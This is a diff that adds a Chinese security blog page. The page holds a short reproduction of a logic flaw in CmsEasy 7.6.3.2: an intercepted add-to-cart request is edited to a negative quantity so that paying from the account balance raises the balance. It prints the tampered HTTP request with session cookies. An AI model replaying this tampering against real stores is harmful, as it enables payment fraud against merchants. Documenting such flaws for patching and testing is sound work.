@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="CmsEasy 7.6.3.2_20200422 逻辑漏洞一、漏洞简介二、漏洞影响CmsEasy 7.6.3.2 三、复现过程   1.登录任意账号    图片 1.png    2.点击任意产品    图片 2.png    3.点开任意一个产品，前提是有余量    图片 3.png    4.输入任意正常数量，burp开启抓包，点击添加到购物车    图片 4.png    5.将抓到的包中的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/CmsEasy/CmsEasy%207.6.3.2_20200422%20%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="CmsEasy 7.6.3.2_20200422 逻辑漏洞一、漏洞简介二、漏洞影响CmsEasy 7.6.3.2 三、复现过程   1.登录任意账号    图片 1.png    2.点击任意产品    图片 2.png    3.点开任意一个产品，前提是有余量    图片 3.png    4.输入任意正常数量，burp开启抓包，点击添加到购物车    图片 4.png    5.将抓到的包中的">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:25:54.158Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-CmsEasy/CmsEasy 7.6.3.2_20200422 逻辑漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/CmsEasy/CmsEasy%207.6.3.2_20200422%20%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.158Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CmsEasy-7-6-3-2-20200422-逻辑漏洞"><a href="#CmsEasy-7-6-3-2-20200422-逻辑漏洞" class="headerlink" title="CmsEasy 7.6.3.2_20200422 逻辑漏洞"></a>CmsEasy 7.6.3.2_20200422 逻辑漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>CmsEasy 7.6.3.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><ul>
+<li><p>  1.登录任意账号    图片 1.png</p>
+</li>
+<li><p>  2.点击任意产品    图片 2.png</p>
+</li>
+<li><p>  3.点开任意一个产品，前提是有余量    图片 3.png</p>
+</li>
+<li><p>  4.输入任意正常数量，burp开启抓包，点击添加到购物车    图片 4.png</p>
+</li>
+<li><p>  5.将抓到的包中的最后一个数字改为负数    图片 5.png    图片 6.png    然后放包</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>GET /index.php?case=archive&amp;act=doorders&amp;aid=527&amp;datatype=&amp;thisnum=-100 HTTP/1.1
+Host: www.0-sec.org
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0
+Referer: http://localhost/index.php?case=archive&amp;act=show&amp;aid=527
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=5j671r8cg9kfppbkpl7i0n1te0; loginfalse=0; login_username=admin; login_password=787cc8f99d30dc9cbeeadd77f99efb84; ce_orders_cookie=TL%2BA8RODL9PeNwoN
+Connection: close
+</code></pre>
+<ul>
+<li><p>  6.此时可以看到购物车中为负数    图片 7.png</p>
+</li>
+<li><p>  7.查看个人中心中的余额，为5600    图片 8.png</p>
+</li>
+<li><p>  8.点击购物车    图片 9.png</p>
+</li>
+<li><p>  9.点击下图内容    图片 10.png</p>
+</li>
+<li><p>  10.填写完成之后，点击在线支付    图片 11.png</p>
+</li>
+<li><p>  11.选择余额支付，点击购买    图片 12.png</p>
+</li>
+<li><p>  12.购买成功    图片 13.png</p>
+</li>
+<li><p>  13.回到个人中心，可以看到余额的变化    图片 14.png</p>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/CmsEasy/CmsEasy%207.6.3.2_20200422%20%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnh30043y8v1f0yj2pnf" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Cobub%20Razor/%EF%BC%88CVE-2018-7720%EF%BC%89Cobub%20Razor%200.7.2%20%E5%AD%98%E5%9C%A8%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/CmsEasy/CmsEasy%207.3.8%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
